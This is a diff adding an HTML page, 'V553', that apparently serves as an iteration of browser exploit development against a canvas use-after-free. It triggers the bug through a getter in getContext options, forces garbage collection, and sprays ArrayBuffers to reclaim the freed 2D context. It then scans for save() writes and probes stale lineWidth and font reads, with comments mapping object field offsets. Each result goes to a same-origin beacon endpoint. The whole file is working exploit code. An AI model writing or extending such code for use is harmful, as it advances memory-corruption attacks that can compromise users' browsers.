@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V553</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V553-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V553-save-detect');
+
+// STRATEGY: Force GC first, then do UAF + AB + save() with ZERO beacons
+// between them. Detect save() write by scanning AB for non-zero bytes.
+// save() is ++m_unrealizedSaveCount — writes to a specific offset.
+
+// Phase 0: Force full GC to raise the eden threshold
+var junk;
+for(var g=0;g<30;g++){
+  junk=[];
+  for(var j=0;j<10000;j++)junk.push({a:j,b:'x'.repeat(50)});
+  junk=null;
+}
+b('GC','forced full GC');
+
+// T1: Single AB attempt — UAF + 1 AB + save() x5 + scan
+// NO BEACONS between UAF and scan!
+(function T1(){
+  var ctx=triggerUAF();
+  var ab=new ArrayBuffer(768);
+  var u8=new Uint8Array(ab);
+
+  // 5 saves — NO beacons, NO other allocations
+  ctx.save();
+  ctx.save();
+  ctx.save();
+  ctx.save();
+  ctx.save();
+
+  // Scan for non-zero bytes
+  var hits=[];
+  for(var i=0;i<768;i++){
+    if(u8[i]!==0) hits.push(i+':0x'+u8[i].toString(16));
+  }
+  // NOW beacon (may trigger GC — but we have our data)
+  b('T1-RESULT','hits='+hits.length+(hits.length?','+hits.join(','):''));
+})();
+
+// T2: 5 AB attempt
+(function T2(){
+  // Force GC again between tests
+  var jnk;
+  for(var g=0;g<10;g++){jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;}
+
+  var ctx=triggerUAF();
+  var abs=[];
+  var u8s=[];
+  for(var i=0;i<5;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    u8s.push(new Uint8Array(ab));
+  }
+
+  ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+
+  // Check ALL ABs for non-zero bytes
+  var found='none';
+  for(var a=0;a<5;a++){
+    var hits=[];
+    for(var i=0;i<768;i++){
+      if(u8s[a][i]!==0) hits.push(i+':0x'+u8s[a][i].toString(16));
+    }
+    if(hits.length>0){
+      found='AB['+a+']:'+hits.join(',');
+      break;
+    }
+  }
+  b('T2-RESULT',found);
+})();
+
+// T3: 20 AB attempt
+(function T3(){
+  var jnk;
+  for(var g=0;g<10;g++){jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;}
+
+  var ctx=triggerUAF();
+  var abs=[];
+  var u8s=[];
+  for(var i=0;i<20;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    u8s.push(new Uint8Array(ab));
+  }
+
+  ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+
+  var found='none';
+  for(var a=0;a<20;a++){
+    var hits=[];
+    for(var i=0;i<768;i++){
+      if(u8s[a][i]!==0) hits.push(i+':0x'+u8s[a][i].toString(16));
+    }
+    if(hits.length>0){
+      found='AB['+a+']:'+hits.join(',');
+      break;
+    }
+  }
+  b('T3-RESULT',found);
+})();
+
+// T4: 50 AB attempt — same as V551 T5 but NO beacon between spray and save
+(function T4(){
+  var jnk;
+  for(var g=0;g<10;g++){jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;}
+
+  var ctx=triggerUAF();
+  var abs=[];
+  var u8s=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    u8s.push(new Uint8Array(ab));
+  }
+
+  // 10 saves for stronger signal
+  for(var s=0;s<10;s++) ctx.save();
+
+  var found='none';
+  for(var a=0;a<50;a++){
+    var hits=[];
+    for(var i=0;i<768;i++){
+      if(u8s[a][i]!==0) hits.push(i+':0x'+u8s[a][i].toString(16));
+    }
+    if(hits.length>0){
+      found='AB['+a+']:'+hits.join(',');
+      break;
+    }
+  }
+  b('T4-RESULT',found);
+})();
+
+// T5: After finding the offset in T1-T4, test if lineWidth is accessible
+// Use same-type reclaim to get a VALID context, then save through it,
+// then free it again and AB spray. But first — just try reading lineWidth
+// on stale freed memory (no AB) to get the existing m_buffer pointer
+(function T5(){
+  var jnk;
+  for(var g=0;g<10;g++){jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;}
+
+  var ctx=triggerUAF();
+  // NO AB spray — read lineWidth on stale freed memory
+  // m_stateStack.m_buffer still points to inline buffer (object+128)
+  // m_size still 1 from the old context
+  // state().lineWidth = *(float*)(m_buffer + lineWidth_offset_in_State)
+  // This reads the OLD context's lineWidth from freed-but-mapped memory
+  var lw;
+  try{
+    lw=ctx.lineWidth;
+    b('T5-STALE-LW','val='+lw);
+  }catch(e){b('T5-STALE-LW-ERR',e.message)}
+
+  // Also try reading font
+  try{
+    var f=ctx.font;
+    b('T5-STALE-FONT','val='+f);
+  }catch(e){b('T5-STALE-FONT-ERR',e.message)}
+})();
+
+// T6: Read stale lineWidth through the default context (V550 shows 1.0 for fresh ctx)
+// This confirms: reading freed memory with valid m_stateStack works
+(function T6(){
+  var jnk;
+  for(var g=0;g<10;g++){jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;}
+
+  var ctx=triggerUAF();
+  // Set a unique lineWidth IN the getter, before context is freed
+  // Actually, triggerUAF sets nothing — default lineWidth=1
+  // The freed memory should still have lineWidth=1
+
+  // Now try: create 1 AB, then read lineWidth
+  // If AB reclaimed: m_size=0 → CrashOnOverflow
+  // If AB didn't reclaim: stale data → lineWidth=1
+  var ab=new ArrayBuffer(768);
+  var u8=new Uint8Array(ab);
+  // Set m_size=1 at offset 124 to prevent CrashOnOverflow
+  u8[124]=1;
+  // Set m_capacity>=1 at offset 120
+  u8[120]=1;
+  // m_buffer at offset 112 is still 0 (NULL) → state() reads from NULL → crash
+  // So this won't work without a valid m_buffer
+  // Skip the lineWidth read and just check if save() detects
+  ctx.save();ctx.save();ctx.save();
+
+  var hits=[];
+  for(var i=0;i<768;i++){
+    if(u8[i]!==0 && i!==124 && i!==120) hits.push(i+':0x'+u8[i].toString(16));
+  }
+  b('T6-RESULT','hits='+hits.length+(hits.length?','+hits.join(','):'')
+    +',u8[120]='+u8[120]+',u8[124]='+u8[124]);
+})();
+
+// T7: Multi-attempt loop — try 30 independent UAF+1AB combos
+// Each attempt: triggerUAF + 1AB + 5 saves + scan
+// Report the FIRST hit
+(function T7(){
+  var jnk;
+  for(var g=0;g<10;g++){jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;}
+
+  var found=null;
+  for(var att=0;att<30&&!found;att++){
+    var ctx=triggerUAF();
+    var ab=new ArrayBuffer(768);
+    var u8=new Uint8Array(ab);
+    ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+    for(var i=0;i<768;i++){
+      if(u8[i]!==0){
+        var hits=[];
+        for(var j=i;j<Math.min(i+20,768);j++){
+          if(u8[j]!==0) hits.push(j+':0x'+u8[j].toString(16));
+        }
+        found='att='+att+','+hits.join(',');
+        break;
+      }
+    }
+  }
+  b('T7-RESULT',found||'no-hit-in-30');
+})();
+
+b('DONE','V553-all-complete');
+</script>
+</body></html>
